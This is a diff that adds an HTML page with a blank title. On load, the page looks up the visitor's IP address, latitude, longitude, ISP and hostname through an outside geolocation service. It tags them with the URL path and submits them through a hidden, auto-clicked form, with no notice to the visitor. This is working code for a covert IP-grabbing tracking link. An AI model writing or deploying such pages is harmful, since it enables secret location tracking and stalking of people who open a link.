@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title></title>
+    <script>
+      window.onload = function() {
+        page.getPathLink();
+        if(page.path) {
+          ip.getIP(function(data) {
+            document.getElementById("path").value = page.path;
+            document.getElementById("ip").value = data.ip;
+            document.getElementById("x").value = data.latitude;
+            document.getElementById("y").value = data.longitude;
+            document.getElementById("isp").value = data.isp;
+            document.getElementById("hostname").value = data.hostname;
+
+            document.getElementById("submitButton").click();
+          });
+        }
+      }
+
+      var ip= {
+        getIP: function(cb) {
+          fetch('https://json.geoiplookup.io/')
+            .then( res => {
+              return res.text();
+            })
+            .then(data => {
+              cb(JSON.parse(data));
+            })
+        }
+      }
+      var page = {
+        path: undefined,
+        getPathLink: function() {
+          var split = window.location.href.split("/")[3];
+           this.path = split;
+        }
+      }
+    </script>
+  </head>
+  <body>
+    <form action="submitIpData" method="post" style="display:none;">
+      <input type="text" id="path" name="path">
+      <input type="text" id="ip" name="ip">
+      <input type="text" id="x" name="x">
+      <input type="text" id="y" name="y">
+      <input type="text" id="isp" name="isp">
+      <input type="text" id="hostname" name="hostname">
+      <input type="submit"  value="submit" id="submitButton">
+    </form>
+  </body>
+</html>
